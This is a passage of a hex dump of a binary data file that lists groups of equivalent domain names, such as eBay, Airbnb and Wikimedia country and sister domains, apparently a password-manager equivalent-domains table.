000028f0: 2e63 6f6d 0000 0000 0100 0000 0300 ffff  .com............
00002900: 1000 0080 0400 ffff 6469 7363 6f76 6572  ........discover
00002910: 6361 7264 2e63 6f6d 0000 0000 1300 ffff  card.com........
00002920: 2000 0000 0300 ffff 0200 0000 0700 ffff   ...............
00002930: 0000 0000 0300 ffff 0700 0080 0400 ffff  ................
00002940: 6463 752e 6f72 6700 0100 0000 0300 ffff  dcu.org.........
00002950: 0e00 0080 0400 ffff 6463 752d 6f6e 6c69  ........dcu-onli
00002960: 6e65 2e6f 7267 0000 0000 0000 1300 ffff  ne.org..........
00002970: 2100 0000 0300 ffff 0300 0000 0700 ffff  !...............
00002980: 0000 0000 0300 ffff 0e00 0080 0400 ffff  ................
00002990: 6865 616c 7468 6361 7265 2e67 6f76 0000  healthcare.gov..
000029a0: 0100 0000 0300 ffff 1200 0080 0400 ffff  ................
000029b0: 6375 6964 6164 6f64 6573 616c 7564 2e67  cuidadodesalud.g
000029c0: 6f76 0000 0000 0000 0200 0000 0300 ffff  ov..............
000029d0: 0700 0080 0400 ffff 636d 732e 676f 7600  ........cms.gov.
000029e0: 0000 0000 1300 ffff 2200 0000 0300 ffff  ........".......
000029f0: 0200 0000 0700 ffff 0000 0000 0300 ffff  ................
00002a00: 0900 0080 0400 ffff 7065 7063 6f2e 636f  ........pepco.co
00002a10: 6d00 0000 0000 0000 0100 0000 0300 ffff  m...............
00002a20: 1100 0080 0400 ffff 7065 7063 6f68 6f6c  ........pepcohol
00002a30: 6469 6e67 732e 636f 6d00 0000 0000 0000  dings.com.......
00002a40: 0000 0000 1300 ffff 2300 0000 0300 ffff  ........#.......
00002a50: 0200 0000 0700 ffff 0000 0000 0300 ffff  ................
00002a60: 0d00 0080 0400 ffff 6365 6e74 7572 7932  ........century2
00002a70: 312e 636f 6d00 0000 0100 0000 0300 ffff  1.com...........
00002a80: 0c00 0080 0400 ffff 3231 6f6e 6c69 6e65  ........21online
00002a90: 2e63 6f6d 0000 0000 0000 0000 1300 ffff  .com............
00002aa0: 2400 0000 0300 ffff 0300 0000 0700 ffff  $...............
00002ab0: 0000 0000 0300 ffff 0b00 0080 0400 ffff  ................
00002ac0: 636f 6d63 6173 742e 636f 6d00 0000 0000  comcast.com.....
00002ad0: 0100 0000 0300 ffff 0b00 0080 0400 ffff  ................
00002ae0: 636f 6d63 6173 742e 6e65 7400 0000 0000  comcast.net.....
00002af0: 0200 0000 0300 ffff 0b00 0080 0400 ffff  ................
00002b00: 7866 696e 6974 792e 636f 6d00 0000 0000  xfinity.com.....
00002b10: 0000 0000 1300 ffff 2500 0000 0300 ffff  ........%.......
00002b20: 0200 0000 0700 ffff 0000 0000 0300 ffff  ................
00002b30: 1300 0080 0400 ffff 6372 6963 6b65 7477  ........cricketw
00002b40: 6972 656c 6573 732e 636f 6d00 0000 0000  ireless.com.....
00002b50: 0100 0000 0300 ffff 0f00 0080 0400 ffff  ................
00002b60: 6169 6f77 6972 656c 6573 732e 636f 6d00  aiowireless.com.
00002b70: 0000 0000 1300 ffff 2600 0000 0300 ffff  ........&.......
00002b80: 0200 0000 0700 ffff 0000 0000 0300 ffff  ................
00002b90: 0d00 0080 0400 ffff 6d61 6e64 7462 616e  ........mandtban
00002ba0: 6b2e 636f 6d00 0000 0100 0000 0300 ffff  k.com...........
00002bb0: 0700 0080 0400 ffff 6d74 622e 636f 6d00  ........mtb.com.
00002bc0: 0000 0000 1300 ffff 2700 0000 0300 ffff  ........'.......
00002bd0: 0200 0000 0700 ffff 0000 0000 0300 ffff  ................
00002be0: 0b00 0080 0400 ffff 6472 6f70 626f 782e  ........dropbox.
00002bf0: 636f 6d00 0000 0000 0100 0000 0300 ffff  com.............
00002c00: 0e00 0080 0400 ffff 6765 7464 726f 7062  ........getdropb
00002c10: 6f78 2e63 6f6d 0000 0000 0000 1300 ffff  ox.com..........
00002c20: 2800 0000 0300 ffff 0200 0000 0700 ffff  (...............
00002c30: 0000 0000 0300 ffff 0c00 0080 0400 ffff  ................
00002c40: 736e 6170 6669 7368 2e63 6f6d 0000 0000  snapfish.com....
00002c50: 0100 0000 0300 ffff 0b00 0080 0400 ffff  ................
00002c60: 736e 6170 6669 7368 2e63 6100 0000 0000  snapfish.ca.....
00002c70: 0000 0000 1300 ffff 2900 0000 0300 ffff  ........).......
00002c80: 0400 0000 0700 ffff 0000 0000 0300 ffff  ................
00002c90: 0b00 0080 0400 ffff 616c 6962 6162 612e  ........alibaba.
00002ca0: 636f 6d00 0000 0000 0100 0000 0300 ffff  com.............
00002cb0: 0e00 0080 0400 ffff 616c 6965 7870 7265  ........aliexpre
00002cc0: 7373 2e63 6f6d 0000 0200 0000 0300 ffff  ss.com..........
00002cd0: 0a00 0080 0400 ffff 616c 6979 756e 2e63  ........aliyun.c
00002ce0: 6f6d 0000 0000 0000 0300 0000 0300 ffff  om..............
00002cf0: 0600 0080 0400 ffff 6e65 742e 636e 0000  ........net.cn..
00002d00: 0000 0000 1300 ffff 2a00 0000 0300 ffff  ........*.......
00002d10: 0200 0000 0700 ffff 0000 0000 0300 ffff  ................
00002d20: 0f00 0080 0400 ffff 706c 6179 7374 6174  ........playstat
00002d30: 696f 6e2e 636f 6d00 0100 0000 0300 ffff  ion.com.........
00002d40: 1c00 0080 0400 ffff 736f 6e79 656e 7465  ........sonyente
00002d50: 7274 6169 6e6d 656e 746e 6574 776f 726b  rtainmentnetwork
00002d60: 2e63 6f6d 0000 0000 0000 0000 1300 ffff  .com............
00002d70: 2b00 0000 0300 ffff 0500 0000 0700 ffff  +...............
00002d80: 0000 0000 0300 ffff 1000 0080 0400 ffff  ................
00002d90: 6d65 7263 6164 6f6c 6976 7265 2e63 6f6d  mercadolivre.com
00002da0: 0100 0000 0300 ffff 1300 0080 0400 ffff  ................
00002db0: 6d65 7263 6164 6f6c 6976 7265 2e63 6f6d  mercadolivre.com
00002dc0: 2e62 7200 0000 0000 0200 0000 0300 ffff  .br.............
00002dd0: 1000 0080 0400 ffff 6d65 7263 6164 6f6c  ........mercadol
00002de0: 6962 7265 2e63 6f6d 0300 0000 0300 ffff  ibre.com........
00002df0: 1300 0080 0400 ffff 6d65 7263 6164 6f6c  ........mercadol
00002e00: 6962 7265 2e63 6f6d 2e61 7200 0000 0000  ibre.com.ar.....
00002e10: 0400 0000 0300 ffff 1300 0080 0400 ffff  ................
00002e20: 6d65 7263 6164 6f6c 6962 7265 2e63 6f6d  mercadolibre.com
00002e30: 2e6d 7800 0000 0000 0000 0000 1300 ffff  .mx.............
00002e40: 2c00 0000 0300 ffff 0200 0000 0700 ffff  ,...............
00002e50: 0000 0000 0300 ffff 0b00 0080 0400 ffff  ................
00002e60: 7a65 6e64 6573 6b2e 636f 6d00 0000 0000  zendesk.com.....
00002e70: 0100 0000 0300 ffff 0900 0080 0400 ffff  ................
00002e80: 7a6f 7069 6d2e 636f 6d00 0000 0000 0000  zopim.com.......
00002e90: 0000 0000 1300 ffff 2d00 0000 0300 ffff  ........-.......
00002ea0: 0200 0000 0700 ffff 0000 0000 0300 ffff  ................
00002eb0: 0c00 0080 0400 ffff 6175 746f 6465 736b  ........autodesk
00002ec0: 2e63 6f6d 0000 0000 0100 0000 0300 ffff  .com............
00002ed0: 0d00 0080 0400 ffff 7469 6e6b 6572 6361  ........tinkerca
00002ee0: 642e 636f 6d00 0000 0000 0000 1300 ffff  d.com...........
00002ef0: 2e00 0000 0300 ffff 0700 0000 0700 ffff  ................
00002f00: 0000 0000 0300 ffff 0d00 0080 0400 ffff  ................
00002f10: 7261 696c 6e61 7469 6f6e 2e72 7500 0000  railnation.ru...
00002f20: 0100 0000 0300 ffff 0d00 0080 0400 ffff  ................
00002f30: 7261 696c 6e61 7469 6f6e 2e64 6500 0000  railnation.de...
00002f40: 0200 0000 0300 ffff 0f00 0080 0400 ffff  ................
00002f50: 7261 696c 2d6e 6174 696f 6e2e 636f 6d00  rail-nation.com.
00002f60: 0300 0000 0300 ffff 0d00 0080 0400 ffff  ................
00002f70: 7261 696c 6e61 7469 6f6e 2e67 7200 0000  railnation.gr...
00002f80: 0400 0000 0300 ffff 0d00 0080 0400 ffff  ................
00002f90: 7261 696c 6e61 7469 6f6e 2e75 7300 0000  railnation.us...
00002fa0: 0500 0000 0300 ffff 0e00 0080 0400 ffff  ................
00002fb0: 7472 7563 6b6e 6174 696f 6e2e 6465 0000  trucknation.de..
00002fc0: 0600 0000 0300 ffff 1000 0080 0400 ffff  ................
00002fd0: 7472 6176 6961 6e67 616d 6573 2e63 6f6d  traviangames.com
00002fe0: 0000 0000 1300 ffff 2f00 0000 0300 ffff  ......../.......
00002ff0: 0200 0000 0700 ffff 0000 0000 0300 ffff  ................
00003000: 0900 0080 0400 ffff 7770 6375 2e63 6f6f  ........wpcu.coo
00003010: 7000 0000 0000 0000 0100 0000 0300 ffff  p...............
00003020: 0e00 0080 0400 ffff 7770 6375 6f6e 6c69  ........wpcuonli
00003030: 6e65 2e63 6f6d 0000 0000 0000 1300 ffff  ne.com..........
00003040: 3000 0000 0300 ffff 0300 0000 0700 ffff  0...............
00003050: 0000 0000 0300 ffff 0e00 0080 0400 ffff  ................
00003060: 6d61 7468 6c65 7469 6373 2e63 6f6d 0000  mathletics.com..
00003070: 0100 0000 0300 ffff 1100 0080 0400 ffff  ................
00003080: 6d61 7468 6c65 7469 6373 2e63 6f6d 2e61  mathletics.com.a
00003090: 7500 0000 0000 0000 0200 0000 0300 ffff  u...............
000030a0: 1000 0080 0400 ffff 6d61 7468 6c65 7469  ........mathleti
000030b0: 6373 2e63 6f2e 756b 0000 0000 1300 ffff  cs.co.uk........
000030c0: 3100 0000 0300 ffff 0200 0000 0700 ffff  1...............
000030d0: 0000 0000 0300 ffff 1200 0080 0400 ffff  ................
000030e0: 6469 7363 6f75 6e74 6261 6e6b 2e63 6f2e  discountbank.co.
000030f0: 696c 0000 0000 0000 0100 0000 0300 ffff  il..............
00003100: 0e00 0080 0400 ffff 7465 6c65 6261 6e6b  ........telebank
00003110: 2e63 6f2e 696c 0000 0000 0000 1300 ffff  .co.il..........
00003120: 3200 0000 0300 ffff 0200 0000 0700 ffff  2...............
00003130: 0000 0000 0300 ffff 0600 0080 0400 ffff  ................
00003140: 6d69 2e63 6f6d 0000 0100 0000 0300 ffff  mi.com..........
00003150: 0a00 0080 0400 ffff 7869 616f 6d69 2e63  ........xiaomi.c
00003160: 6f6d 0000 0000 0000 0000 0000 1300 ffff  om..............
00003170: 3300 0000 0300 ffff 0200 0000 0700 ffff  3...............
00003180: 0000 0000 0300 ffff 0b00 0080 0400 ffff  ................
00003190: 706f 7374 6570 6179 2e69 7400 0000 0000  postepay.it.....
000031a0: 0100 0000 0300 ffff 0800 0080 0400 ffff  ................
000031b0: 706f 7374 652e 6974 0000 0000 1300 ffff  poste.it........
000031c0: 3400 0000 0300 ffff 0200 0000 0700 ffff  4...............
000031d0: 0000 0000 0300 ffff 0c00 0080 0400 ffff  ................
000031e0: 6661 6365 626f 6f6b 2e63 6f6d 0000 0000  facebook.com....
000031f0: 0100 0000 0300 ffff 0d00 0080 0400 ffff  ................
00003200: 6d65 7373 656e 6765 722e 636f 6d00 0000  messenger.com...
00003210: 0000 0000 1300 ffff 3500 0000 0300 ffff  ........5.......
00003220: 0300 0000 0700 ffff 0000 0000 0300 ffff  ................
00003230: 0d00 0080 0400 ffff 736b 7973 706f 7274  ........skysport
00003240: 732e 636f 6d00 0000 0100 0000 0300 ffff  s.com...........
00003250: 0a00 0080 0400 ffff 736b 7962 6574 2e63  ........skybet.c
00003260: 6f6d 0000 0000 0000 0200 0000 0300 ffff  om..............
00003270: 0c00 0080 0400 ffff 736b 7976 6567 6173  ........skyvegas
00003280: 2e63 6f6d 0000 0000 0000 0000 1300 ffff  .com............
00003290: 3600 0000 0300 ffff 0500 0000 0700 ffff  6...............
000032a0: 0000 0000 0300 ffff 1800 0080 0400 ffff  ................
000032b0: 6469 736e 6579 6d6f 7669 6573 616e 7977  disneymoviesanyw
000032c0: 6865 7265 2e63 6f6d 0100 0000 0300 ffff  here.com........
000032d0: 0600 0080 0400 ffff 676f 2e63 6f6d 0000  ........go.com..
000032e0: 0200 0000 0300 ffff 0a00 0080 0400 ffff  ................
000032f0: 6469 736e 6579 2e63 6f6d 0000 0000 0000  disney.com......
00003300: 0300 0000 0300 ffff 0800 0080 0400 ffff  ................
00003310: 6461 6474 2e63 6f6d 0400 0000 0300 ffff  dadt.com........
00003320: 0e00 0080 0400 ffff 6469 736e 6579 706c  ........disneypl
00003330: 7573 2e63 6f6d 0000 0000 0000 1300 ffff  us.com..........
00003340: 3700 0000 0300 ffff 0200 0000 0700 ffff  7...............
00003350: 0000 0000 0300 ffff 0e00 0080 0400 ffff  ................
00003360: 706f 6b65 6d6f 6e2d 676c 2e63 6f6d 0000  pokemon-gl.com..
00003370: 0100 0000 0300 ffff 0b00 0080 0400 ffff  ................
00003380: 706f 6b65 6d6f 6e2e 636f 6d00 0000 0000  pokemon.com.....
00003390: 0000 0000 1300 ffff 3800 0000 0300 ffff  ........8.......
000033a0: 0200 0000 0700 ffff 0000 0000 0300 ffff  ................
000033b0: 0800 0080 0400 ffff 6d79 7576 2e63 6f6d  ........myuv.com
000033c0: 0100 0000 0300 ffff 0800 0080 0400 ffff  ................
000033d0: 7576 7675 2e63 6f6d 0000 0000 1300 ffff  uvvu.com........
000033e0: 3900 0000 0300 ffff 0200 0000 0700 ffff  9...............
000033f0: 0000 0000 0300 ffff 0900 0080 0400 ffff  ................
00003400: 6d64 736f 6c2e 636f 6d00 0000 0000 0000  mdsol.com.......
00003410: 0100 0000 0300 ffff 0d00 0080 0400 ffff  ................
00003420: 696d 6564 6964 6174 612e 636f 6d00 0000  imedidata.com...
00003430: 0000 0000 1300 ffff 3a00 0000 0300 ffff  ........:.......
00003440: 0200 0000 0700 ffff 0000 0000 0300 ffff  ................
00003450: 1000 0080 0400 ffff 6261 6e6b 2d79 6168  ........bank-yah
00003460: 6176 2e63 6f2e 696c 0100 0000 0300 ffff  av.co.il........
00003470: 1200 0080 0400 ffff 6261 6e6b 6861 706f  ........bankhapo
00003480: 616c 696d 2e63 6f2e 696c 0000 0000 0000  alim.co.il......
00003490: 0000 0000 1300 ffff 3b00 0000 0300 ffff  ........;.......
000034a0: 0200 0000 0700 ffff 0000 0000 0300 ffff  ................
000034b0: 0900 0080 0400 ffff 7365 6172 732e 636f  ........sears.co
000034c0: 6d00 0000 0000 0000 0100 0000 0300 ffff  m...............
000034d0: 0800 0080 0400 ffff 7368 6c64 2e6e 6574  ........shld.net
000034e0: 0000 0000 1300 ffff 3c00 0000 0300 ffff  ........<.......
000034f0: 0200 0000 0700 ffff 0000 0000 0300 ffff  ................
00003500: 0900 0080 0400 ffff 7869 616d 692e 636f  ........xiami.co
00003510: 6d00 0000 0000 0000 0100 0000 0300 ffff  m...............
00003520: 0a00 0080 0400 ffff 616c 6970 6179 2e63  ........alipay.c
00003530: 6f6d 0000 0000 0000 0000 0000 1300 ffff  om..............
00003540: 3d00 0000 0300 ffff 0200 0000 0700 ffff  =...............
00003550: 0000 0000 0300 ffff 0a00 0080 0400 ffff  ................
00003560: 6265 6c6b 696e 2e63 6f6d 0000 0000 0000  belkin.com......
00003570: 0100 0000 0300 ffff 0b00 0080 0400 ffff  ................
00003580: 7365 6564 6f6e 6b2e 636f 6d00 0000 0000  seedonk.com.....
00003590: 0000 0000 1300 ffff 3e00 0000 0300 ffff  ........>.......
000035a0: 0200 0000 0700 ffff 0000 0000 0300 ffff  ................
000035b0: 0c00 0080 0400 ffff 7475 7262 6f74 6178  ........turbotax
000035c0: 2e63 6f6d 0000 0000 0100 0000 0300 ffff  .com............
000035d0: 0a00 0080 0400 ffff 696e 7475 6974 2e63  ........intuit.c
000035e0: 6f6d 0000 0000 0000 0000 0000 1300 ffff  om..............
000035f0: 3f00 0000 0300 ffff 0200 0000 0700 ffff  ?...............
00003600: 0000 0000 0300 ffff 0b00 0080 0400 ffff  ................
00003610: 7368 6f70 6966 792e 636f 6d00 0000 0000  shopify.com.....
00003620: 0100 0000 0300 ffff 0d00 0080 0400 ffff  ................
00003630: 6d79 7368 6f70 6966 792e 636f 6d00 0000  myshopify.com...
00003640: 0000 0000 1300 ffff 4000 0000 0300 ffff  ........@.......
00003650: 1700 0000 0700 ffff 0000 0000 0300 ffff  ................
00003660: 0800 0080 0400 ffff 6562 6179 2e63 6f6d  ........ebay.com
00003670: 0100 0000 0300 ffff 0700 0080 0400 ffff  ................
00003680: 6562 6179 2e61 7400 0200 0000 0300 ffff  ebay.at.........
00003690: 0700 0080 0400 ffff 6562 6179 2e62 6500  ........ebay.be.
000036a0: 0300 0000 0300 ffff 0700 0080 0400 ffff  ................
000036b0: 6562 6179 2e63 6100 0400 0000 0300 ffff  ebay.ca.........
000036c0: 0700 0080 0400 ffff 6562 6179 2e63 6800  ........ebay.ch.
000036d0: 0500 0000 0300 ffff 0700 0080 0400 ffff  ................
000036e0: 6562 6179 2e63 6e00 0600 0000 0300 ffff  ebay.cn.........
000036f0: 0a00 0080 0400 ffff 6562 6179 2e63 6f2e  ........ebay.co.
00003700: 6a70 0000 0000 0000 0700 0000 0300 ffff  jp..............
00003710: 0a00 0080 0400 ffff 6562 6179 2e63 6f2e  ........ebay.co.
00003720: 7468 0000 0000 0000 0800 0000 0300 ffff  th..............
00003730: 0a00 0080 0400 ffff 6562 6179 2e63 6f2e  ........ebay.co.
00003740: 756b 0000 0000 0000 0900 0000 0300 ffff  uk..............
00003750: 0b00 0080 0400 ffff 6562 6179 2e63 6f6d  ........ebay.com
00003760: 2e61 7500 0000 0000 0a00 0000 0300 ffff  .au.............
00003770: 0b00 0080 0400 ffff 6562 6179 2e63 6f6d  ........ebay.com
00003780: 2e68 6b00 0000 0000 0b00 0000 0300 ffff  .hk.............
00003790: 0b00 0080 0400 ffff 6562 6179 2e63 6f6d  ........ebay.com
000037a0: 2e6d 7900 0000 0000 0c00 0000 0300 ffff  .my.............
000037b0: 0b00 0080 0400 ffff 6562 6179 2e63 6f6d  ........ebay.com
000037c0: 2e73 6700 0000 0000 0d00 0000 0300 ffff  .sg.............
000037d0: 0b00 0080 0400 ffff 6562 6179 2e63 6f6d  ........ebay.com
000037e0: 2e74 7700 0000 0000 0e00 0000 0300 ffff  .tw.............
000037f0: 0700 0080 0400 ffff 6562 6179 2e64 6500  ........ebay.de.
00003800: 0f00 0000 0300 ffff 0700 0080 0400 ffff  ................
00003810: 6562 6179 2e65 7300 1000 0000 0300 ffff  ebay.es.........
00003820: 0700 0080 0400 ffff 6562 6179 2e66 7200  ........ebay.fr.
00003830: 1100 0000 0300 ffff 0700 0080 0400 ffff  ................
00003840: 6562 6179 2e69 6500 1200 0000 0300 ffff  ebay.ie.........
00003850: 0700 0080 0400 ffff 6562 6179 2e69 6e00  ........ebay.in.
00003860: 1300 0000 0300 ffff 0700 0080 0400 ffff  ................
00003870: 6562 6179 2e69 7400 1400 0000 0300 ffff  ebay.it.........
00003880: 0700 0080 0400 ffff 6562 6179 2e6e 6c00  ........ebay.nl.
00003890: 1500 0000 0300 ffff 0700 0080 0400 ffff  ................
000038a0: 6562 6179 2e70 6800 1600 0000 0300 ffff  ebay.ph.........
000038b0: 0700 0080 0400 ffff 6562 6179 2e70 6c00  ........ebay.pl.
000038c0: 0000 0000 1300 ffff 4100 0000 0300 ffff  ........A.......
000038d0: 0200 0000 0700 ffff 0000 0000 0300 ffff  ................
000038e0: 0c00 0080 0400 ffff 7465 6368 6461 7461  ........techdata
000038f0: 2e63 6f6d 0000 0000 0100 0000 0300 ffff  .com............
00003900: 0b00 0080 0400 ffff 7465 6368 6461 7461  ........techdata
00003910: 2e63 6800 0000 0000 0000 0000 1300 ffff  .ch.............
00003920: 4200 0000 0300 ffff 0200 0000 0700 ffff  B...............
00003930: 0000 0000 0300 ffff 0a00 0080 0400 ffff  ................
00003940: 7363 6877 6162 2e63 6f6d 0000 0000 0000  schwab.com......
00003950: 0100 0000 0300 ffff 0e00 0080 0400 ffff  ................
00003960: 7363 6877 6162 706c 616e 2e63 6f6d 0000  schwabplan.com..
00003970: 0000 0000 1300 ffff 4300 0000 0300 ffff  ........C.......
00003980: 0200 0000 0700 ffff 0000 0000 0300 ffff  ................
00003990: 0900 0080 0400 ffff 7465 736c 612e 636f  ........tesla.co
000039a0: 6d00 0000 0000 0000 0100 0000 0300 ffff  m...............
000039b0: 0f00 0080 0400 ffff 7465 736c 616d 6f74  ........teslamot
000039c0: 6f72 732e 636f 6d00 0000 0000 1300 ffff  ors.com.........
000039d0: 4400 0000 0300 ffff 0400 0000 0700 ffff  D...............
000039e0: 0000 0000 0300 ffff 1100 0080 0400 ffff  ................
000039f0: 6d6f 7267 616e 7374 616e 6c65 792e 636f  morganstanley.co
00003a00: 6d00 0000 0000 0000 0100 0000 0300 ffff  m...............
00003a10: 1b00 0080 0400 ffff 6d6f 7267 616e 7374  ........morganst
00003a20: 616e 6c65 7963 6c69 656e 7473 6572 762e  anleyclientserv.
00003a30: 636f 6d00 0000 0000 0200 0000 0300 ffff  com.............
00003a40: 1400 0080 0400 ffff 7374 6f63 6b70 6c61  ........stockpla
00003a50: 6e63 6f6e 6e65 6374 2e63 6f6d 0000 0000  nconnect.com....
00003a60: 0300 0000 0300 ffff 0600 0080 0400 ffff  ................
00003a70: 6d73 2e63 6f6d 0000 0000 0000 1300 ffff  ms.com..........
00003a80: 4500 0000 0300 ffff 0200 0000 0700 ffff  E...............
00003a90: 0000 0000 0300 ffff 0a00 0080 0400 ffff  ................
00003aa0: 7461 7861 6374 2e63 6f6d 0000 0000 0000  taxact.com......
00003ab0: 0100 0000 0300 ffff 1000 0080 0400 ffff  ................
00003ac0: 7461 7861 6374 6f6e 6c69 6e65 2e63 6f6d  taxactonline.com
00003ad0: 0000 0000 1300 ffff 4600 0000 0300 ffff  ........F.......
00003ae0: 0b00 0000 0700 ffff 0000 0000 0300 ffff  ................
00003af0: 0d00 0080 0400 ffff 6d65 6469 6177 696b  ........mediawik
00003b00: 692e 6f72 6700 0000 0100 0000 0300 ffff  i.org...........
00003b10: 0d00 0080 0400 ffff 7769 6b69 626f 6f6b  ........wikibook
00003b20: 732e 6f72 6700 0000 0200 0000 0300 ffff  s.org...........
00003b30: 0c00 0080 0400 ffff 7769 6b69 6461 7461  ........wikidata
00003b40: 2e6f 7267 0000 0000 0300 0000 0300 ffff  .org............
00003b50: 0d00 0080 0400 ffff 7769 6b69 6d65 6469  ........wikimedi
00003b60: 612e 6f72 6700 0000 0400 0000 0300 ffff  a.org...........
00003b70: 0c00 0080 0400 ffff 7769 6b69 6e65 7773  ........wikinews
00003b80: 2e6f 7267 0000 0000 0500 0000 0300 ffff  .org............
00003b90: 0d00 0080 0400 ffff 7769 6b69 7065 6469  ........wikipedi
00003ba0: 612e 6f72 6700 0000 0600 0000 0300 ffff  a.org...........
00003bb0: 0d00 0080 0400 ffff 7769 6b69 7175 6f74  ........wikiquot
00003bc0: 652e 6f72 6700 0000 0700 0000 0300 ffff  e.org...........
00003bd0: 0e00 0080 0400 ffff 7769 6b69 736f 7572  ........wikisour
00003be0: 6365 2e6f 7267 0000 0800 0000 0300 ffff  ce.org..........
00003bf0: 0f00 0080 0400 ffff 7769 6b69 7665 7273  ........wikivers
00003c00: 6974 792e 6f72 6700 0900 0000 0300 ffff  ity.org.........
00003c10: 0e00 0080 0400 ffff 7769 6b69 766f 7961  ........wikivoya
00003c20: 6765 2e6f 7267 0000 0a00 0000 0300 ffff  ge.org..........
00003c30: 0e00 0080 0400 ffff 7769 6b74 696f 6e61  ........wiktiona
00003c40: 7279 2e6f 7267 0000 0000 0000 1300 ffff  ry.org..........
00003c50: 4700 0000 0300 ffff 3500 0000 0700 ffff  G.......5.......
00003c60: 0000 0000 0300 ffff 0900 0080 0400 ffff  ................
00003c70: 6169 7262 6e62 2e61 7400 0000 0000 0000  airbnb.at.......
00003c80: 0100 0000 0300 ffff 0900 0080 0400 ffff  ................
00003c90: 6169 7262 6e62 2e62 6500 0000 0000 0000  airbnb.be.......
00003ca0: 0200 0000 0300 ffff 0900 0080 0400 ffff  ................
00003cb0: 6169 7262 6e62 2e63 6100 0000 0000 0000  airbnb.ca.......
00003cc0: 0300 0000 0300 ffff 0900 0080 0400 ffff  ................
00003cd0: 6169 7262 6e62 2e63 6800 0000 0000 0000  airbnb.ch.......
00003ce0: 0400 0000 0300 ffff 0900 0080 0400 ffff  ................
00003cf0: 6169 7262 6e62 2e63 6c00 0000 0000 0000  airbnb.cl.......
00003d00: 0500 0000 0300 ffff 0c00 0080 0400 ffff  ................
00003d10: 6169 7262 6e62 2e63 6f2e 6372 0000 0000  airbnb.co.cr....
00003d20: 0600 0000 0300 ffff 0c00 0080 0400 ffff  ................
00003d30: 6169 7262 6e62 2e63 6f2e 6964 0000 0000  airbnb.co.id....
00003d40: 0700 0000 0300 ffff 0c00 0080 0400 ffff  ................
00003d50: 6169 7262 6e62 2e63 6f2e 696e 0000 0000  airbnb.co.in....
00003d60: 0800 0000 0300 ffff 0c00 0080 0400 ffff  ................
00003d70: 6169 7262 6e62 2e63 6f2e 6b72 0000 0000  airbnb.co.kr....
00003d80: 0900 0000 0300 ffff 0c00 0080 0400 ffff  ................
00003d90: 6169 7262 6e62 2e63 6f2e 6e7a 0000 0000  airbnb.co.nz....
00003da0: 0a00 0000 0300 ffff 0c00 0080 0400 ffff  ................
00003db0: 6169 7262 6e62 2e63 6f2e 756b 0000 0000  airbnb.co.uk....
00003dc0: 0b00 0000 0300 ffff 0c00 0080 0400 ffff  ................
00003dd0: 6169 7262 6e62 2e63 6f2e 7665 0000 0000  airbnb.co.ve....
00003de0: 0c00 0000 0300 ffff 0a00 0080 0400 ffff  ................
00003df0: 6169 7262 6e62 2e63 6f6d 0000 0000 0000  airbnb.com......
00003e00: 0d00 0000 0300 ffff 0d00 0080 0400 ffff  ................
00003e10: 6169 7262 6e62 2e63 6f6d 2e61 7200 0000  airbnb.com.ar...
00003e20: 0e00 0000 0300 ffff 0d00 0080 0400 ffff  ................
00003e30: 6169 7262 6e62 2e63 6f6d 2e61 7500 0000  airbnb.com.au...
00003e40: 0f00 0000 0300 ffff 0d00 0080 0400 ffff  ................
00003e50: 6169 7262 6e62 2e63 6f6d 2e62 6f00 0000  airbnb.com.bo...
00003e60: 1000 0000 0300 ffff 0d00 0080 0400 ffff  ................
00003e70: 6169 7262 6e62 2e63 6f6d 2e62 7200 0000  airbnb.com.br...
00003e80: 1100 0000 0300 ffff 0d00 0080 0400 ffff  ................
00003e90: 6169 7262 6e62 2e63 6f6d 2e62 7a00 0000  airbnb.com.bz...
00003ea0: 1200 0000 0300 ffff 0d00 0080 0400 ffff  ................
00003eb0: 6169 7262 6e62 2e63 6f6d 2e63 6f00 0000  airbnb.com.co...
00003ec0: 1300 0000 0300 ffff 0d00 0080 0400 ffff  ................
00003ed0: 6169 7262 6e62 2e63 6f6d 2e65 6300 0000  airbnb.com.ec...
00003ee0: 1400 0000 0300 ffff 0d00 0080 0400 ffff  ................
00003ef0: 6169 7262 6e62 2e63 6f6d 2e67 7400 0000  airbnb.com.gt...
00003f00: 1500 0000 0300 ffff 0d00 0080 0400 ffff  ................
00003f10: 6169 7262 6e62 2e63 6f6d 2e68 6b00 0000  airbnb.com.hk...
00003f20: 1600 0000 0300 ffff 0d00 0080 0400 ffff  ................
00003f30: 6169 7262 6e62 2e63 6f6d 2e68 6e00 0000  airbnb.com.hn...
00003f40: 1700 0000 0300 ffff 0d00 0080 0400 ffff  ................
00003f50: 6169 7262 6e62 2e63 6f6d 2e6d 7400 0000  airbnb.com.mt...
00003f60: 1800 0000 0300 ffff 0d00 0080 0400 ffff  ................
00003f70: 6169 7262 6e62 2e63 6f6d 2e6d 7900 0000  airbnb.com.my...
00003f80: 1900 0000 0300 ffff 0d00 0080 0400 ffff  ................
00003f90: 6169 7262 6e62 2e63 6f6d 2e6e 6900 0000  airbnb.com.ni...
00003fa0: 1a00 0000 0300 ffff 0d00 0080 0400 ffff  ................
00003fb0: 6169 7262 6e62 2e63 6f6d 2e70 6100 0000  airbnb.com.pa...
00003fc0: 1b00 0000 0300 ffff 0d00 0080 0400 ffff  ................
00003fd0: 6169 7262 6e62 2e63 6f6d 2e70 6500 0000  airbnb.com.pe...
00003fe0: 1c00 0000 0300 ffff 0d00 0080 0400 ffff  ................
00003ff0: 6169 7262 6e62 2e63 6f6d 2e70 7900 0000  airbnb.com.py...
00004000: 1d00 0000 0300 ffff 0d00 0080 0400 ffff  ................
00004010: 6169 7262 6e62 2e63 6f6d 2e73 6700 0000  airbnb.com.sg...
00004020: 1e00 0000 0300 ffff 0d00 0080 0400 ffff  ................
00004030: 6169 7262 6e62 2e63 6f6d 2e73 7600 0000  airbnb.com.sv...
00004040: 1f00 0000 0300 ffff 0d00 0080 0400 ffff  ................
00004050: 6169 7262 6e62 2e63 6f6d 2e74 7200 0000  airbnb.com.tr...
00004060: 2000 0000 0300 ffff 0d00 0080 0400 ffff   ...............
00004070: 6169 7262 6e62 2e63 6f6d 2e74 7700 0000  airbnb.com.tw...
00004080: 2100 0000 0300 ffff 0900 0080 0400 ffff  !...............
00004090: 6169 7262 6e62 2e63 7a00 0000 0000 0000  airbnb.cz.......
000040a0: 2200 0000 0300 ffff 0900 0080 0400 ffff  "...............
000040b0: 6169 7262 6e62 2e64 6500 0000 0000 0000  airbnb.de.......
000040c0: 2300 0000 0300 ffff 0900 0080 0400 ffff  #...............
000040d0: 6169 7262 6e62 2e64 6b00 0000 0000 0000  airbnb.dk.......
000040e0: 2400 0000 0300 ffff 0900 0080 0400 ffff  $...............
